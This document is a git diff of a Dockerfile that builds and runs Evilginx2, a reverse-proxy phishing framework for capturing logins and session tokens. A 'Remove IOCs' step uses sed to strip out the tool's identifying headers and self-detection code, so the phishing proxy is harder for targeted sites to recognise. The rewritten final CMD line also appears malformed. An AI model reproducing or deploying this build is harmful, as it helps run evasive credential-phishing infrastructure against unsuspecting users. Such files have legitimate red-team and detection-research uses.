@@ -1,36 +1,60 @@
+ARG EVILGINX_BIN="/bin/evilginx"
+
+# Stage 1 - Build EvilGinx2 app
+FROM alpine:latest AS build
+
+LABEL maintainer="froyo75@users.noreply.github.com"
+
+ARG GOLANG_VERSION=1.16
+ARG GOPATH=/opt/go
+ARG GITHUB_USER="kgretzky"
+ARG EVILGINX_REPOSITORY="github.com/${GITHUB_USER}/evilginx2"
+ARG INSTALL_PACKAGES="go git bash"
+ARG PROJECT_DIR="${GOPATH}/src/${EVILGINX_REPOSITORY}"
+ARG EVILGINX_BIN
+
+RUN apk add --no-cache ${INSTALL_PACKAGES}
+
+# Install & Configure Go
+RUN set -ex \
+    && wget https://dl.google.com/go/go${GOLANG_VERSION}.src.tar.gz && tar -C /usr/local -xzf go$GOLANG_VERSION.src.tar.gz \
+    && rm go${GOLANG_VERSION}.src.tar.gz \
+    && cd /usr/local/go/src && ./make.bash \
+# Clone EvilGinx2 Repository
+    && mkdir -pv ${GOPATH}/src/github.com/${GITHUB_USER} \
+    && git -C ${GOPATH}/src/github.com/${GITHUB_USER} clone https://${EVILGINX_REPOSITORY}
+
+# Remove IOCs
+RUN set -ex \
+    && sed -i -e 's/egg2 := req.Host/\/\/egg2 := req.Host/g' \
+     -e 's/e_host := req.Host/\/\/e_host := req.Host/g' \
+     -e 's/req.Header.Set(string(hg), egg2)/\/\/req.Header.Set(string(hg), egg2)/g' \
+     -e 's/req.Header.Set(string(e), e_host)/\/\/req.Header.Set(string(e), e_host)/g' \
+     -e 's/p.cantFindMe(req, e_host)/\/\/p.cantFindMe(req, e_host)/g' ${PROJECT_DIR}/core/http_proxy.go
+    
+# Build EvilGinx2
+WORKDIR ${PROJECT_DIR}
+RUN set -x \
+    && go get -v && go build -v \
+    && cp -v evilginx2 ${EVILGINX_BIN} \
+    && mkdir -v /app && cp -vr phishlets /app
+
+# Stage 2 - Build Runtime Container
 FROM alpine:latest
 
 LABEL maintainer="froyo75@users.noreply.github.com"
 
-ENV GOLANG_VERSION=1.16
-ENV GOPATH=/opt/go
-ENV GITHUB_USER="kgretzky"
-ENV EVILGINX_REPOSITORY="github.com/${GITHUB_USER}/evilginx2"
-ENV INSTALL_PACKAGES="go git gcc musl-dev make openssl-dev ca-certificates"
-ENV PROJECT_DIR="${GOPATH}/src/${EVILGINX_REPOSITORY}"
-ENV EVILGINX_BIN="/bin/evilginx"
 ENV EVILGINX_PORTS="443 80 53/udp"
+ARG EVILGINX_BIN
 
-RUN apk update && apk add --no-cache bash ${INSTALL_PACKAGES} && update-ca-certificates
+RUN apk add --no-cache bash && mkdir -v /app
 
-# Install & Configure Go
-RUN wget https://dl.google.com/go/go${GOLANG_VERSION}.src.tar.gz && tar -C /usr/local -xzf go$GOLANG_VERSION.src.tar.gz
-RUN cd /usr/local/go/src && ./make.bash
-RUN PATH="/usr/local/go/bin:$PATH"
-RUN PATH=$PATH:${GOPATH}/bin 
-RUN rm go${GOLANG_VERSION}.src.tar.gz
+# Install EvilGinx2
+WORKDIR /app
+COPY --from=build ${EVILGINX_BIN} ${EVILGINX_BIN}
+COPY --from=build /app .
 
-# Install & Run EvilGinx2
-RUN set -ex \
-    && mkdir -p ${GOPATH}/src/github.com/${GITHUB_USER} \
-    && git -C ${GOPATH}/src/github.com/${GITHUB_USER} clone https://github.com/${GITHUB_USER}/evilginx2 \
-    # Remove IOCs
-    && sed -i -e 's/egg2 := req.Host/\/\/egg2 := req.Host/g' -e 's/e_host := req.Host/\/\/e_host := req.Host/g' -e 's/req.Header.Set(string(hg), egg2)/\/\/req.Header.Set(string(hg), egg2)/g' -e 's/req.Header.Set(string(e), e_host)/\/\/req.Header.Set(string(e), e_host)/g' -e 's/p.cantFindMe(req, e_host)/\/\/p.cantFindMe(req, e_host)/g' ${PROJECT_DIR}/core/http_proxy.go \
-    && cd ${PROJECT_DIR}/ && go get ./... && make \
-    && cp -v ${PROJECT_DIR}/bin/evilginx ${EVILGINX_BIN} \
-    && mkdir /app && cp -vr ${PROJECT_DIR}/phishlets /app \
-    && apk del ${INSTALL_PACKAGES} && rm -rf /var/cache/apk/* && rm -rf ${GOPATH}/src/*
-
+# Configure Runtime Container
 EXPOSE ${EVILGINX_PORTS}
 
-CMD ["/bin/evilginx", "-p", "/app/phishlets"]
+CMD [${EVILGINX_BIN}, "-p", "/app/phishlets"]
